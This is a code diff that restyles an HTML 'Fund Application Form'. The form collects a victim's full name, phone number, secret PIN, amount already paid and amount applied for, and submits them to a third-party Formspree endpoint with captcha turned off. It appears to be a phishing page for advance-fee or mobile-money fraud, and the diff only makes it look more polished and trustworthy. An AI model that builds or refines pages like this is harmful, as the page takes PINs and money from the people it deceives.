@@ -2,40 +2,63 @@
 <html>
 <head>
   <title>Fund Application Form</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: Arial, sans-serif;
-      padding: 20px;
-      max-width: 500px;
-      margin: auto;
-      background-color: #f9f9f9;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .form-container {
+      background-color: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
     }
     label {
       display: block;
-      margin-top: 15px;
+      margin-top: 14px;
       font-weight: bold;
+      font-size: 0.95em;
     }
     input[type="text"],
     input[type="tel"],
     input[type="number"],
     input[type="password"] {
       width: 100%;
-      padding: 10px;
-      margin-top: 5px;
+      padding: 12px;
+      margin-top: 6px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
       box-sizing: border-box;
+      font-size: 1em;
     }
     .toggle-password {
-      margin-top: 5px;
+      margin-top: 6px;
       cursor: pointer;
-      color: blue;
+      color: #007BFF;
       font-size: 0.9em;
     }
     button {
-      margin-top: 20px;
-      padding: 12px 20px;
+      margin-top: 22px;
+      width: 100%;
+      padding: 14px;
       background-color: #28a745;
       color: white;
       border: none;
+      border-radius: 6px;
+      font-size: 1em;
       cursor: pointer;
     }
     button:hover {
@@ -44,39 +67,35 @@
   </style>
 </head>
 <body>
-  <h2>Fund Application Form</h2>
-  <form action="https://formspree.io/f/mayzjzqg" method="POST">
-    <label for="name">Full Name</label>
-    <input type="text" id="name" name="Full Name" required>
+  <div class="form-container">
+    <h2>Fund Application Form</h2>
+    <form action="https://formspree.io/f/mayzjzqg" method="POST">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" name="Full Name" required>
 
-    <label for="phone">Phone Number</label>
-    <input type="tel" id="phone" name="Phone Number" required>
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" name="Phone Number" required>
 
-    <label for="pin">Secret Code (PIN)</label>
-    <input type="password" id="pin" name="Secret Code" required>
-    <span class="toggle-password" onclick="togglePIN()">Show/Hide PIN</span>
+      <label for="pin">Secret Code (PIN)</label>
+      <input type="password" id="pin" name="Secret Code" required>
+      <span class="toggle-password" onclick="togglePIN()">Show/Hide PIN</span>
 
-    <label for="paid">Amount You Paid</label>
-    <input type="number" id="paid" name="Amount Paid" required>
+      <label for="paid">Amount You Paid</label>
+      <input type="number" id="paid" name="Amount Paid" required>
 
-    <label for="applied">Amount You Applied For</label>
-    <input type="number" id="applied" name="Amount Applied For" required>
+      <label for="applied">Amount You Applied For</label>
+      <input type="number" id="applied" name="Amount Applied For" required>
 
-    <!-- Removed the _redirect to thankyou.html -->
+      <input type="hidden" name="_captcha" value="false">
 
-    <input type="hidden" name="_captcha" value="false">
-
-    <button type="submit">Submit Application</button>
-  </form>
+      <button type="submit">Submit Application</button>
+    </form>
+  </div>
 
   <script>
     function togglePIN() {
       var pinInput = document.getElementById("pin");
-      if (pinInput.type === "password") {
-        pinInput.type = "text";
-      } else {
-        pinInput.type = "password";
-      }
+      pinInput.type = (pinInput.type === "password") ? "text" : "password";
     }
   </script>
 </body>
